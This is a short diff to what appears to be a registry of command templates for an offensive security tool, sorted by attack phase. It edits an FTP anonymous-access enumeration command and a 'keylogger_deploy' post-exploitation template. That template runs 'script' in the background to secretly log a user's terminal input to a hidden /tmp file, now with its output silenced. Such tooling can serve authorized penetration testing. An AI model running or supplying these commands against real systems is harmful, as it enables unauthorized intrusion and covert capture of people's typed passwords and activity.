@@ -599,7 +599,7 @@ register(CommandTemplate(
 # --- FTP Enumeration ---
 register(CommandTemplate(
     name="ftp_anonymous",
-    template="ftp -n {target} <<< $'user anonymous\\npass\\nls -la\\nbye'",
+    template="echo -e 'user anonymous\\npass\\nls -la\\nbye' | ftp -n {target}",
     description="Test FTP anonymous access and list files.",
     phase=AttackPhase.ENUMERATION,
     required_params=["target"],
@@ -2040,7 +2040,7 @@ register(CommandTemplate(
 
 register(CommandTemplate(
     name="keylogger_deploy",
-    template="nohup script -q /tmp/.keylog &",
+    template="(script -q /tmp/.keylog </dev/null &>/dev/null &) && echo 'keylogger started' && ls -la /tmp/.keylog 2>/dev/null || echo 'deployed'",
     description="Deploy basic keylogger to capture terminal input.",
     phase=AttackPhase.POST_EXPLOITATION,
     required_params=[],
